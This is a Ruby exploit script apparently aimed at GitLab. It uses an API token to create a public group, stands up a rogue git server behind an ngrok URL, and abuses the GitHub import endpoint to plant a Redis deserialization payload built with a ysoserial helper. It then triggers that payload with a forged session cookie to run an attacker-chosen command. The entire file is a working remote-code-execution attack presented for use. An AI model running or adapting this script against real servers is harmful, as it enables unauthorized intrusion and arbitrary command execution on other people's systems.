#!/usr/bin/env ruby

# require 'bundler'
# Bundler.require(:default)
require_relative 'ysoserial'
require_relative 'git-server'
require_relative 'httpwrapper'
include HttpWrapper

DEBUG = false
USE_PROXY = false
PROXY_ADDR = '127.0.0.1'
PROXY_PORT = 8080

def debug(msg)
  puts msg.inspect if DEBUG
end

def http
  @http ||= build_http(ARGV[0], USE_PROXY, PROXY_ADDR, PROXY_PORT)
end

def auth_token
  @auth_token ||= ARGV[1]
end

def payload
  @payload ||= "#{Ysoserial::Payloads::Redis.generate(session_id, ARGV[2])}"
end

def session_id
  @session_id ||= ('a'..'z').to_a.shuffle[0,4].join
end

def remote_repo
  @remote_repo ||= ENV['NGROK_URL']
end

def create_group(group_name)
  puts ('Creating Group')
  req = Net::HTTP::Post.new('/api/v4/groups', initheader = {'PRIVATE-TOKEN' => auth_token})
  req.content_type = 'application/json'
  req.body = {name: group_name, path: group_name, visibility: 'public'}.to_json
  res = http.request(req)
  raise RuntimeError, 'Failed to create group' unless res&.code == '201'
  puts ("Group [#{group_name}] created!")
end

def import_github_repo(group_name, github_hostname)
  puts 'Importing Github Repo'
  data = {
    personal_access_token: SecureRandom.hex(8), 
    repo_id: rand(1000),
    target_namespace: group_name,
    new_name:"gh-import-#{rand(1000)}",
    github_hostname: github_hostname
  }.to_json
  req = Net::HTTP::Post.new("/api/v4/import/github", initheader = {'PRIVATE-TOKEN' => auth_token})
  req.body = data
  req.content_type = 'application/json'
  res = http.request(req)
  raise RuntimeError, 'Failed to import github repo' unless res&.code == '201'
  puts 'Github Repo Imported'
end

def trigger_payload(group_name)
  puts 'Triggering Payload'
  req = Net::HTTP::Get.new("/#{group_name}", initheader = {'Cookie':"_gitlab_session=#{session_id}"})
  res = http.request(req)
  raise RuntimeError, 'Failed to trigger payload' unless res&.code == '500'
  puts 'Payload Triggered'
end

def exploit
  begin
    puts "Starting web server..."
    debug("Session ID: #{session_id}")
    debug("Payload: #{payload}")
    debug("Remote Repo: #{remote_repo}")
    pid = Process.fork do
      Signal.trap("INT") { puts 'Stopping web server ...' }
      GitServer.set :payload => payload, :remote_repo => remote_repo
      GitServer.start!
    end
    # gives the web server time to start
    sleep 3
    group_name = SecureRandom.hex(8)
    create_group(group_name)
    import_github_repo(group_name, remote_repo)
    sleep 7
    trigger_payload(group_name)
  rescue => e
    puts "#{e.class} - #{e.message}"
  ensure
    if pid
      Process.kill("INT", pid)
      Process.wait
    end
  end
end

if __FILE__ == $0
  exploit
end

